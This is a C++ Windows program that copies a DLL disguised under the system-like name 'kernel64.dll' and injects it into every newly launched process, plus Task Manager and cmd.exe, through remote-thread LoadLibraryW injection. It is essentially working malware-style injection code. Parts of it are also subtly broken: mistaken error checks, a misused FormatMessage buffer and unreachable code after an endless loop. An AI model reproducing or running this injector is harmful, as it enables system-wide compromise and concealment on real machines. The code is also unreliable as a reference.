#include <windows.h> 
#include <tlhelp32.h> 
#include <shlwapi.h> 
#include <conio.h> 
#include <stdio.h> 
#include <time.h> 
#include <iostream> 
#include <string>
#include <vector>

#pragma comment(lib, "Shlwapi.lib")

#define WIN32_LEAN_AND_MEAN 

using PID = DWORD;

std::vector<PID> enumerateProcess(const std::wstring& processName = {}, const std::wstring ignoreName = {})
{
	std::vector<PID> pids;

	auto thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE)
	{
		return pids;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	auto handle = Process32First(thSnapShot, &pe);
	while (handle)
	{
		const std::wstring name{ pe.szExeFile };
		if ((processName.empty() || processName == name) && (ignoreName.empty() || name.find(ignoreName) == std::wstring::npos))
		{
			pids.push_back(pe.th32ProcessID);
		}

		handle = Process32Next(thSnapShot, &pe);
	}

	return pids;
}

std::wstring GetLastErrorAsString()
{
	DWORD errorMessageId = GetLastError();
	if (errorMessageId == 0)
	{
		return {}; 
	}

	wchar_t* messageBuffer = nullptr;
	const auto flags = (FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS);
	const size_t size = FormatMessage(flags, nullptr, errorMessageId, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), messageBuffer, 0, nullptr);

	std::wstring message(messageBuffer, size);

	LocalFree(messageBuffer);

	return message;
}

bool injectDll(PID pid, const std::wstring& dllPath)
{
	std::wcout << L"Injecting DLL: " << dllPath << std::endl;
	std::wcout << L"Injecting in PID: " << pid << std::endl;

	if (!pid)
	{
		std::wcout << L"Invalid PID" << std::endl;
		return false;
	}

	auto proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!proc)
	{
		std::wcout << L"OpenProcess() failed: " << GetLastErrorAsString() << std::endl;
		return false;
	}

	auto LoadLibraryWAddr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (!LoadLibraryWAddr)
	{
		std::wcout << L"Couldn't load address of 'LoadLibraryW': " << GetLastErrorAsString() << std::endl;
		return false;
	}

	// Allocate space in the process for our DLL 
	auto remoteString = (LPVOID)VirtualAllocEx(proc, nullptr, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteString)
	{
		std::wcout << L"Failed to allocate string space in target: " << GetLastErrorAsString() << std::endl;
		return false;
	}

	// Write the string name of our DLL in the memory allocated 
	WriteProcessMemory(proc, (LPVOID)remoteString, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr);
	if (!remoteString)
	{
		std::wcout << L"Failed to write dll path into target: " << GetLastErrorAsString() << std::endl;
		return false;
	}

	// Load our DLL 
	CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryWAddr, (LPVOID)remoteString, 0, nullptr);
	if (!remoteString)
	{
		std::wcout << L"Failed to create remote thread: " << GetLastErrorAsString() << std::endl;
		return false;
	}

	CloseHandle(proc);

	return true;
}

int main(int argc, char * argv[])
{
	srand(time(nullptr));
	const std::wstring newPath = L".\\kernel64.dll" + std::to_wstring(rand());
	_wsystem((L"copy .\\kernel64.dll " + newPath).c_str());

	wchar_t fullpathBuffer[MAX_PATH] = { 0 };
	GetFullPathName(newPath.c_str(), MAX_PATH, fullpathBuffer, nullptr);

	std::vector<PID> oldProcessList;
	while (true)
	{
		std::vector<PID> processList = enumerateProcess();
		Sleep(500);
		for (const auto pid : processList)
		{
			if (std::find(oldProcessList.begin(), oldProcessList.end(), pid) == oldProcessList.end() && pid != GetCurrentProcessId())
			{
				injectDll(pid, fullpathBuffer);
			}
		}
		oldProcessList = processList;
	}

	Sleep(500);

	for (PID pid : enumerateProcess(L"Taskmgr.exe"))
	{
		injectDll(pid, fullpathBuffer);
	}

	/*
	for (PID pid : enumerateProcess(L"explorer.exe"))
	{
		injectDll(pid, fullpathBuffer);
	}
	*/

	for (PID pid : enumerateProcess(L"cmd.exe"))
	{
		injectDll(pid, fullpathBuffer);
	}

	std::cin.get();

	return 0; 
}